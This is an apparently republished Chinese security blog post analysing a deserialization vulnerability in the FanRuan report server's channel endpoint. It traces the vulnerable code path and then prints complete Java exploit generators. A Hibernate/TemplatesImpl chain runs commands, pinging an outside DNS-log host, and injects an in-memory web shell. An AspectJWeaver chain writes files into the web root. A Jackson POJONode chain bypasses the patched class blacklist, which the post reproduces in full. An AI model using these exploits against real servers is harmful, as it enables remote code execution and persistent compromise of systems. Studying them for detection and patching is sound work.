#  帆软报表 channel 反序列化漏洞分析与利用   
泾弦安全  泾弦安全   2024-08-22 12:50  
  
**国家利益 高于一切**  
  
🔥师傅您好：  
为了确保您不错过我们的最新网络安全资讯、技术分享和前沿动态，请将我们设为星标🌟！  
这样，您就能轻松追踪我们的每一篇精彩内容，与我们一起共筑网络安全防线！  
感谢您的支持与关注！  
💪  
  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/smiley_83b.png "")  
免责声明：文章所涉及内容，仅供安全研究教学使用，由于传播、利用本文所提供的信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
  
  
    在近期忙于处理hvv相关事务中，我们延迟了对公众号动态的更新。今天，我们希望与大家分享一篇关于某软的反序列化漏洞的深入分析。此漏洞在hw打点的过程中偶尔还会遇到，因此分享给大家。  
  
    本文我们已经在FreeBuf平台发表过一次，现在我们决定在我们的公众号上再次进行分享，以便让更多的读者了解和防范此类漏洞。如文中有任何不准确之处，欢迎大家指正，我们将会及时进行修改和更新，废话不多说让我们开始吧！  
  
**0x01 漏洞分析**  
  
通过访问漏洞接口查看到对应的处理类：  
com.fr.decision.extension.report.api.remote.RemoteDesignResource.onMessage  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8eFhW5PY6kOkEicqyk35QABOBtkjxDPhQDAGfp3oH6nWldfP1Ys0TpBQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a82AdKVf12Dkq9goEPUibeDhqDHcMjsR4jSGibtHXChzhZNb3ygWSDapqQ/640?wx_fmt=png&from=appmsg "")  
  
搜索/channel"} 也可以查到对应的类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a80R0wotQqgfQu2ARic7EcMt5l4mxWDicPaIO7Er7YpaQYaQ87yAUdNGFg/640?wx_fmt=png&from=appmsg "")  
  
可以看到 onMessage 是对应的处理方法  
  
可以看到首先对var1进行了包装，然后再使用WorkContext.handleMessage对其进行的处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8mjy2auAwmVKWYRNKqhbiafQibPSFwcyCun2hjfBNmowbq0AHIVwr0s6Q/640?wx_fmt=png&from=appmsg "")  
  
跟进WorkContext.handleMessage，发现使用了   
  
WorkspaceMessageHandler中的handleMessage方法进行了处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8LyI6kDLxP84IeP6ZzWl2KKeKhSpo6RTKJwjn2Jvmv4pECl0pbcNmqA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8NbRwKauGHTDr3o0zJ0gQMMBdSTz8RnQBvzL93XrUBsZ8YVg0obeoQg/640?wx_fmt=png&from=appmsg "")  
  
跟进 WorkspaceServerInvoker.java handleMessage 方法中  
  
发现又使用 deserializeInvocation方法对数据进行处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8gpCa2nkYe2YD29waTuDkQSWlnHTj2BiahyOrpXcPxNbpkUTTIM7F1MA/640?wx_fmt=png&from=appmsg "")  
  
跟进deserializeInvocation 首先看看GZipSerializerWrapper.wrap方法会返回什么  
  
返回了一个 GZipSerializerWrapper 对象  
  
再看看InvocationSerializer.getDefault()返回了什么  
  
返回了一个 InvocationSerializer对象  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a86L8erDbbF0AhHt84CgKObg08SgpnqicCsAnJkicwpH24GnUMDiaJ7AcIQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8TrbNPopmI5OwH03RJuNjpUFwxsPNlsic0yalSfsdmlAKbbiboaYXQNicg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8O8AwibkCnUhAVDKXGbfAGSSuwPEBvxwsvib2je8LYj2ib7OsbxQKmCnFQ/640?wx_fmt=png&from=appmsg "")  
  
再来跟进 public static Object deserialize(byte[] var0, Serializer var1) 方法  
  
如果var1 不为空 那么就使用var1的deserialize方法处理var2 也就是ByteArrayInputStream包装过的var0  
  
前面也可以知道 var1 是一个GZipSerializerWrapper对象 那么就看这个对象对应的 deserialize方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8cy3DwlJdlibzb0NernA6wgRqUtHdQ0KOAQGGAlwtjULlwqvvDK75OuA/640?wx_fmt=png&from=appmsg "")  
  
GZipSerializerWrapper.deserialize  
  
查看下this.serializer 是什么对象   
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8eryZ6CtcqJXxegxzobttEmPKUxCPImDLNwx6YnubyqgpGjudsIaqpw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8wY1VDY5yWRHlTrMor8lD0vMXUFMibyWicyw23uMnZcCvPQYlYjL7TjJQ/640?wx_fmt=png&from=appmsg "")  
  
因为当时前面使用了warp 然后返回一个 GZipSerializerWrapper的有参构造 而且参数为InvocationSerializer对象  
  
那么this.serializer 就是InvocationSerializer对象  
  
然后就继续跟如 InvocationSerializer对象的deserialize方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8hUYdxW1jeGEfU11hhjJPejT1l5icUEpVbIibJyia6cHb5Lwd4UIfiaibOww/640?wx_fmt=png&from=appmsg "")  
  
InvocationSerializer对象的deserialize方法  
  
可以看到触发了两次readObject 那么流程就走完了，开始寻找链  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a86bZGSk75nv2ibrzA6tm2KfWZEl7Yh6T04icLRFd8MgIvOvo43Q55Ubsg/640?wx_fmt=png&from=appmsg "")  
## 0X02 利用链分析  
### v10.0.10  
  
因为帆软很像shiro 也是内置cb链   
  
目前思路就是shiro无依赖利用链 JavaBean PropertyUtils.getProperty() 进行链的构造  
  
所以目前得先找一个 getter 并且这个可以执行命令  
  
但是这时候我发现 反软内置的 InvokerTransformer 没有继承serializable  
  
考虑 后续用jdk内置自带的TemplatesImpl类的getOutputProperties进行  
  
后续发现 内置也没有有PropertyUtils 类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4ITxUDZuxQIwd0ayhgE31a8TbtNaNwuMQvoic4fG2iadgtakGgzTaRWKRWh72BdU5P3fMOicLA1yJbZA/640?wx_fmt=png&from=appmsg "")  
  
因为反软内置没有 PropertyUtils，但是考虑也是用getter 这种去进行命令执行的 那么就可以考虑另一个链Hibernate  
  
这条链的具体文章可以 参考 Hibernate  
#### 思路：  
  
通过Hibernate结合TemplatesImpl这条链 触发getOutputProperties 方法中的newTransformer() 去执行任意方法的调用  
#### Hibernate链  
  
```

public class HibernateExp {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object createWithoutConstructor(Class aa) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Object o = reflectionFactory.newConstructorForSerialization(aa, Object.class.getDeclaredConstructor()).newInstance();
        return o;
    }
    public static void main(String[] args) throws Exception{
        Class<?> componentTypeClass = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");

        //动态创建字节码
        String cmd = "java.lang.Runtime.getRuntime().exec(\"ping -c 1 xxxx.dnslog.pw\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "HibernateExp");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        Method getOutputProperties = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        Object getter;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?> getterImpl = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, getOutputProperties);
        }catch (Exception ignored){
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(templates.getClass(), getOutputProperties, "outputProperties");
        }

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
        Object tuplizer = createWithoutConstructor(pojoComponentTuplizerClass);

        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        Object type = createWithoutConstructor(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(type, tuplizer);

        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(type, 1);

        Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
        field3.setAccessible(true);
        field3.set(type, new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "aaa");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, templates);

        byte[] serialize = Serializer.serialize(hashMap);
        String fileName = "ser.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}
```  
  
  
执行命令成功后  
  
打入内存马  
  
**EXP**  
```
public class HibernateExp {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object createWithoutConstructor(Class aa) throws Exception{
        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();
        Object o = reflectionFactory.newConstructorForSerialization(aa, Object.class.getDeclaredConstructor()).newInstance();
        return o;
    }
    public static void main(String[] args) throws Exception{
        Class<?> componentTypeClass = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");
        String memshell = "Base64编码的内存马";
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        byte[] bytes = new BASE64Decoder().decodeBuffer(memshell);

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "HibernateExp");
//        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        Method getOutputProperties = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        Object getter;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?> getterImpl = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, getOutputProperties);
        }catch (Exception ignored){
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?> basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(templates.getClass(), getOutputProperties, "outputProperties");
        }

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
        Object tuplizer = createWithoutConstructor(pojoComponentTuplizerClass);

        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        Object type = createWithoutConstructor(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
        field1.setAccessible(true);
        field1.set(type, tuplizer);

        Field field2 = componentTypeClass.getDeclaredField("propertySpan");
        field2.setAccessible(true);
        field2.set(type, 1);

        Field field3 = componentTypeClass.getDeclaredField("propertyTypes");
        field3.setAccessible(true);
        field3.set(type, new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "aaa");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, templates);

        byte[] serialize = Serializer.serialize(hashMap);
        String fileName = "ser.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}

```  
  
写文件EXP-AspectJWeaver反序列化利用链  
  
AspectJWeaver反序列化利用链  
  
通过查询发现存在 SimpleCache.java 并且内部类StoreableCachingMap是一个继承HashMap的类 那么就可以使用此链![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtT7UibTTzJMAYJSVZP1qawpy3oBQFlL9C01v0V9hYF0Guic0HGSQ193ZJg/640?wx_fmt=png&from=appmsg "")  
  
  
发现也存在内置的 collections4 那么就可以用LazyMap 将其串起来  
  
这里直接对yso的exp进行更改  
```
public class AspectJWeaverEXP {
    public static void main(String[] args) throws Exception {
        String filename ="test9527.txt";
        byte[] content = new BASE64Decoder().decodeBuffer("dGVzdDk1Mjc=");

        // 使用反射获取类的构造函数
        Class ctor = Class.forName("com.fr.third.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor declaredConstructor = ctor.getDeclaredConstructor(String.class,int.class);
        declaredConstructor.setAccessible(true);
        // 实例化类对象
        Object simpleCache = declaredConstructor.newInstance(".", 12);

        // 创建常量转换器，用于将内容转换为常量
        Transformer ct = new ConstantTransformer(content);
        // 创建懒加载Map，并将转换器应用于该Map
        Map lazyMap = LazyMap.lazyMap((Map) simpleCache, ct);

        // 创建TiedMapEntry对象，将懒加载Map和文件名绑定在一起
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        // 创建HashSet对象，并添加一个元素
        HashSet map = new HashSet(1);
        map.add("foo");

        // 使用反射获取HashSet对象的map字段（或backingMap字段）
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        // 使用反射获取HashMap对象的table字段（或elementData字段）
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        // 获取数组中的第一个非空节点
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        // 使用反射设置节点的key字段为TiedMapEntry对象
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, entry);

        // 返回HashSet对象
        byte[] serialize = Serializer.serialize(map);
        String fileName = "ser2.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTKDesR0Ivjah9Ypq1Lo0flZU4eJZPN1g3qFpMPRKn6arN2qLgu04liaw/640?wx_fmt=png&from=appmsg "")  
  
写入web目录只需要将filename改为  
```
String filename ="/webapps/webroot/test9527.txt";
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTKzpLd5pT1T6VNhcMI2diavD0xT15XsCJEBr5xmLp5A6xF18W6wy5syw/640?wx_fmt=png&from=appmsg "")  
### v10.0.15  
  
重新跟下漏洞触发点  
  
发现在漏洞触发点前 InvocationSerializer.class 中的 deserialize 对 输入流又进行了CustomObjectInputStream处理  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTzAxgKIHycXSpt6Pp16ckLqtpChtZxFrS9WakrGyUiad8Ywic9J9snw1Q/640?wx_fmt=png&from=appmsg "")  
  
跟进 CustomObjectInputStream，发现对之前的漏洞进行了修复，修复方案就是将反序列化的类加入的黑名单  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtTxYUkzsaB1Lo5GETdtbOQsMxJfuAj1jlwjtWrbaaoniapmNIvGlKPvdg/640?wx_fmt=png&from=appmsg "")  
  
黑名单  
```
bsh.XThis
bsh.Interpreter
com.mchange.v2.c3p0.PoolBackedDataSource
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase
clojure.lang.PersistentArrayMap
clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a
org.apache.commons.beanutils.BeanComparator
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors.ChainedTransformer
org.apache.commons.collections.functors.ConstantTransformer
org.apache.commons.collections.functors.InstantiateTransformer
org.apache.commons.collections.map.LazyMap
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.keyvalue.TiedMapEntry
com.fr.third.org.apache.commons.collections4.comparators.TransformingComparator
com.fr.third.org.apache.commons.collections4.functors.InvokerTransformer
com.fr.third.org.apache.commons.collections4.functors.ChainedTransformer
com.fr.third.org.apache.commons.collections4.functors.ConstantTransformer
com.fr.third.org.apache.commons.collections4.functors.InstantiateTransformer
com.fr.third.org.apache.commons.fileupload.disk.DiskFileItem
com.fr.third.org.apache.commons.io.output.DeferredFileOutputStream
com.fr.third.org.apache.commons.io.output.ThresholdingOutputStream
org.apache.wicket.util.upload.DiskFileItem
org.apache.wicket.util.io.DeferredFileOutputStream
org.apache.wicket.util.io.ThresholdingOutputStream
org.codehaus.groovy.runtime.ConvertedClosure
org.codehaus.groovy.runtime.MethodClosure
com.fr.third.org.hibernate.engine.spi.TypedValue
com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer
com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer
com.fr.third.org.hibernate.type.AbstractType
com.fr.third.org.hibernate.type.ComponentType
com.fr.third.org.hibernate.type.Type
com.fr.third.org.hibernate.EntityMode
com.sun.rowset.JdbcRowSetImpl
org.jboss.interceptor.builder.InterceptionModelBuilder
org.jboss.interceptor.builder.MethodReference
org.jboss.interceptor.proxy.DefaultInvocationContextFactory
org.jboss.interceptor.proxy.InterceptorMethodHandler
org.jboss.interceptor.reader.ClassMetadataInterceptorReference
org.jboss.interceptor.reader.DefaultMethodMetadata
org.jboss.interceptor.reader.ReflectiveClassMetadata
org.jboss.interceptor.reader.SimpleInterceptorMetadata
org.jboss.interceptor.spi.instance.InterceptorInstantiator
org.jboss.interceptor.spi.metadata.InterceptorReference
org.jboss.interceptor.spi.metadata.MethodMetadata
org.jboss.interceptor.spi.model.InterceptionType
org.jboss.interceptor.spi.model.InterceptionModel
sun.rmi.server.UnicastRef
sun.rmi.transport.LiveRef
sun.rmi.transport.tcp.TCPEndpoint
java.rmi.server.RemoteObject
java.rmi.server.RemoteRef
java.rmi.server.ObjID
java.rmi.RemoteObjectInvocationHandler
java.rmi.server.UnicastRemoteObject
java.rmi.registry.Registry
sun.rmi.server.ActivationGroupImpl
sun.rmi.server.UnicastServerRef
org.springframework.aop.framework.AdvisedSupport
net.sf.json.JSONObject
javax.xml.transform.Templates
org.jboss.weld.interceptor.builder.InterceptionModelBuilder
org.jboss.weld.interceptor.builder.MethodReference
org.jboss.weld.interceptor.proxy.DefaultInvocationContextFactory
org.jboss.weld.interceptor.proxy.InterceptorMethodHandler
org.jboss.weld.interceptor.reader.ClassMetadataInterceptorReference
org.jboss.weld.interceptor.reader.DefaultMethodMetadata
org.jboss.weld.interceptor.reader.ReflectiveClassMetadata
org.jboss.weld.interceptor.reader.SimpleInterceptorMetadata
org.jboss.weld.interceptor.spi.instance.InterceptorInstantiator
org.jboss.weld.interceptor.spi.metadata.InterceptorReference
org.jboss.weld.interceptor.spi.metadata.MethodMetadata
org.jboss.weld.interceptor.spi.model.InterceptionModel
org.jboss.weld.interceptor.spi.model.InterceptionType
org.python.core.PyObject
org.python.core.PyBytecode
org.python.core.PyFunction
org.apache.myfaces.context.servlet.FacesContextImpl
org.apache.myfaces.context.servlet.FacesContextImplBase
org.apache.myfaces.el.CompositeELResolver
org.apache.myfaces.el.unified.FacesELContext
org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression
com.sun.syndication.feed.impl.ObjectBean
com.fr.third.springframework.beans.factory.ObjectFactory
com.fr.third.springframework.core.SerializableTypeWrapper.$MethodInvokeTypeProvider
com.fr.third.springframework.aop.framework.AdvisedSupport
com.fr.third.springframework.aop.target.SingletonTargetSource
com.fr.third.springframework.aop.framework.JdkDynamicAopProxy
com.vaadin.data.util.NestedMethodProperty
com.vaadin.data.util.PropertysetItem
java.util.PriorityQueue
java.lang.reflect.Proxy
javax.management.MBeanServerInvocationHandler
javax.management.openmbean.CompositeDataInvocationHandler
java.beans.EventHandler
java.util.Comparator
com.fr.third.org.reflections.Reflections
```  
  
  
从这里看的黑名单发现链有spring(JONS1)、c3p0、cc4、hibernate  
#### JACKSON链  
  
在写EXP的过程中突然发现 POJONode 和 TemplatesImpl 根本就不在黑名单里，那么我 不就可以直接进行结合来rce嘛  
##### 思路  
```
//第一段是在 com.fasterxml.jackson.databind.node.BaseJsonNode 被类加载器加载前，使用 javassist 工具删除它的 writeReplace 方法，防止触发这个方法的时候会检测 报错

        CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

//不加此段代码 会爆如下错误
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Uu7diaf2LD4LgiaA4LAtykdNdEBZxgvjtT3rbogn3W5wnbgE7M6QL9KXJKEn8exYx8fo9K1bkFOqjVNib3ZVjKyicQ/640?wx_fmt=png&from=appmsg "")  
```
//第二段是构造一个 TemplatesImpl 类型的对象，然后用其构造一个 POJONode 类型的对象。
        String memshell = "";
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        byte[] classBytes = new BASE64Decoder().decodeBuffer(memshell);

        Class tplClass = TemplatesImpl.class;
        Class transFactory = TransformerFactoryImpl.class;
        Object templates = tplClass.newInstance();

        SetFieldValue.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        SetFieldValue.setFieldValue(templates, "_name", "bbb");
        SetFieldValue.setFieldValue(templates, "_tfactory", transFactory.newInstance());

        POJONode node = new POJONode(templates);
```  
```
//第三段是将这个 POJONode 类型的对象设置为 BadAttributeValueExpException 类型的对象的 val 字段的值，之后反序列化时触发 POJONode 类型的对象的 toString 方法
。
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);

        SetFieldValue.setFieldValue(val,"val",node);
```  
  
**缺点-JACKSON 链的不稳定性**  
```
JACKSON 链的不稳定性
有时在使用 JACKSON 链时，我们会遇到报错
这是因为 JACKSON 链触发过程中，在 com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields 中获取了之前找到的 props，且循环触发其 getter
而不是直接触发 TemplatesImpl#getOutputProperties 唯一的getter

所以yso写的是JSON1 链，因为调用直接是 getOutputProperties  getter

不过在环境中 org.springframework.aop.framework.JdkDynamicAopProxy 等都在黑名单所以无法用 JSON1 链
```  
#### 内存码EXP  
  
最终EXP如下  
```
public class POJONodeExp2 {
    public static void main(String[] args) throws Exception {

        CtClass ctClass = ClassPool.getDefault().get("com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        String memshell = "Base64编码的内存马";
        ClassPool pool = new ClassPool();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        byte[] classBytes = new BASE64Decoder().decodeBuffer(memshell);

        Class tplClass = TemplatesImpl.class;
        Class transFactory = TransformerFactoryImpl.class;
        Object templates = tplClass.newInstance();
        //直接读取class文件
//        byte[] classBytes = Files.readAllBytes(Paths.get("Evil.class"));

        SetFieldValue.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        SetFieldValue.setFieldValue(templates, "_name", "bbb");
        SetFieldValue.setFieldValue(templates, "_tfactory", transFactory.newInstance());

        POJONode node = new POJONode(templates);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);

        SetFieldValue.setFieldValue(val,"val",node);

        byte[] serialize = Serializer.serialize(val);
        String fileName = "ser.bin";
        FileOutputStream fos = new FileOutputStream(fileName);
        GZIPOutputStream gzip = new GZIPOutputStream(fos);
        gzip.write(serialize);
        gzip.finish();
        fos.close();
    }
}

```  
  
